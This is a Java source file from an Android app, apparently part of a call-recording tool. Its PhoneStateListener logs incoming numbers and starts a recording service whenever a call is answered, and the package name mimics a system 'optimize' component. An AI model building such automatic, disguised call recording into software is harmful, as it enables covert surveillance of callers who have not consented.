package com.android.sd.optimize;

import android.content.ComponentName;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneListener extends PhoneStateListener {
    private BackService context;
    Intent callIntent;
    boolean isRecording = false;
    public static String filename = "";
    private String LOG_TAG = AppGlobals.getLogTag(getClass());
    public static String sPreviousCallState;
    private RecordService recordService;
    public static String sPhoneNumber;

    public PhoneListener(BackService c) {
        context = c;
    }

    public void onCallStateChanged(int state, String incomingNumber) {
        Log.e(LOG_TAG, "no: " + incomingNumber);
        switch (state) {
            case TelephonyManager.CALL_STATE_IDLE:
                sPreviousCallState = null;
                sPreviousCallState = null;
                Log.e(LOG_TAG, "call_state_idle");
                if (isRecording) {
                    isRecording = false;
                    if (context.received && context.called) {
                        Log.e(LOG_TAG, Util.getTime());
                        context.ringing = false;
                        context.received = false;
                        context.called = false;
                    } else if (context.ringing && context.received) {
                        Log.e(LOG_TAG, Util.getTime());
                        context.ringing = false;
                        context.received = false;
                        context.called = false;
                    }
                    callIntent = new Intent(context, RecordService.class);
                    context.stopService(callIntent);
                }
                break;
            case TelephonyManager.CALL_STATE_RINGING:
                sPhoneNumber = incomingNumber;
                sPreviousCallState = "in";
                Log.e(LOG_TAG, "Call state ringing");
                context.inNo = incomingNumber;
                context.ringing = true;
                context.received = false;
                context.called = false;
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                Log.e(LOG_TAG, "Call state offhook");
                context.received = true;
                callIntent = new Intent(context, RecordService.class);
                ComponentName name = context.startService(callIntent);
                if (name != null) {
                    isRecording = true;
                }
                break;
        }
    }
}
